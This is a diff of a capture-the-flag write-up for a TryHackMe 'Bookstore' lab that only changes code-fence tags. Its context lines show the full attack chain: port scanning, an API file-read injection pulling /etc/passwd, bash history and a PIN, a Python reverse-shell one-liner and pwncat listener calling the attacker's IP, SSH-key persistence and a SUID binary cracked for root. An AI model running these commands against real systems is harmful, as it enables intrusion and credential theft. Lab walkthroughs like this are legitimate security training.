@@ -18,7 +18,7 @@ ___
 ## Port Scanning
 Enumerating the target with an nmap scan to see what ports are open. I begin with the following scan for all open ports: 
 
-```console 
+```sh
 ┌──(viorage㉿kali)-[~/Tryhackme/Bookstore]
 └─$ sudo nmap -p- -v --min-rate=8000 10.10.111.74                                                                                                                                            130 ⨯
 [sudo] password for viorage: 
@@ -141,7 +141,7 @@ Browsing to the api page allows us to view the documentation for the API.
 
 Fuzzing the api with ```curl```
 
-```bash
+```sh
 ┌──(viorage㉿kali)-[~]
 └─$ curl -s http://10.10.111.74:5000/api/v2/resources/books?id=1                                                                                                                                7 ⨯
 [
@@ -158,7 +158,7 @@ Fuzzing the api with ```curl```
 
 I also attempted to change  ```v2``` to ```v1``` , maybe v1 had a vulnerability associated with it.
 
-```bash
+```sh
 ┌──(viorage㉿kali)-[~]
 └─$ curl -s http://10.10.111.74:5000/api/v1/resources/books?id=1
 [
@@ -176,7 +176,7 @@ ___
 ## Fuzzing API (v1) with FFuF
 With the previous hint, fuzzing the api for a possible parameter to read files seems like a logical choice.
 
-```bash
+```sh
 ┌──(viorage㉿kali)-[~]
 └─$ ffuf -w /usr/share/wordlists/dirb/common.txt -u  "http://10.10.111.74:5000/api/v1/resources/books?FUZZ=/etc/passwd"                                                                         1 ⨯
 
@@ -213,7 +213,7 @@ It looks like the show parameter might be vulnerable to injection.
 ## Testing for Injection
 The show parameter is vulnerable to injected, allowing arbitrary file reads
 
-```bash
+```sh
 ┌──(viorage㉿kali)-[~]
 └─$ curl -s http://10.10.111.74:5000/api/v1/resources/books?show=/etc/passwd                                               
 root:x:0:0:root:/root:/bin/bash
@@ -250,7 +250,7 @@ sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
 
 Pulling ```Sid's``` bash history to reveal the PIN ```123-321-135``` allowing access to the console.
 
-```bash
+```sh
 ┌──(viorage㉿kali)-[~]
 └─$ curl -s http://10.10.111.74:5000/api/v1/resources/books?show=/home/sid/.bash_history
 cd /home/sid
@@ -268,7 +268,7 @@ ___
 
 Pulling the user flag with the arbitrary read vulnerability.
 
-```bash
+```sh
 ┌──(viorage㉿kali)-[~]
 └─$ curl -s http://10.10.111.74:5000/api/v1/resources/books?show=/home/sid/user.txt     
 4ea65eb80---snip---ddf7b964ab
@@ -290,7 +290,7 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 Starting an unbreakable pwncat listener
 
-```bash
+```sh
 pwncat -l 443 --self-inject /bin/bash:10.13.18.86:443
 ```
 
@@ -303,7 +303,7 @@ ___
 ## Persistence 
 Making an ssh key for Sid and setting up persistence
 
-```bash
+```sh
 ┌──(viorage㉿kali)-[~/Tryhackme/Bookstore]
 └─$ ssh-keygen -f sid                                                                                                                                                                           1 ⨯
 Generating public/private rsa key pair.
@@ -336,7 +336,7 @@ ___
 There is an interesting file with the SUID bit set named ```try-harder```. I will need to analyze this file from my local machine.
 
 Using scp to copy the file locally
-```bash
+```sh
 ┌──(viorage㉿kali)-[~/Tryhackme/Bookstore/.ssh]
 └─$ scp -i sid sid@10.10.111.74:/home/sid/try-harder ./
 Enter passphrase for key 'sid': 
@@ -353,7 +353,7 @@ Using Ghidra to analyze the file. The program prompts for a number and XORs it w
 
 Using python3 we can reverse the operation to get the Magic Number of 1573743953.
 
-```bash
+```sh
 ┌──(viorage㉿kali)-[~/Tryhackme/Bookstore/.ssh]
 └─$ python3                                            
 Python 3.9.12 (main, Mar 24 2022, 13:02:21) 
@@ -369,7 +369,7 @@ ___
 ## Root
 Gaining root shell with the try-harder binary
 
-```bash
+```sh
 sid@bookstore:~$ ./try-harder 
 What's The Magic Number?!
 1573743953
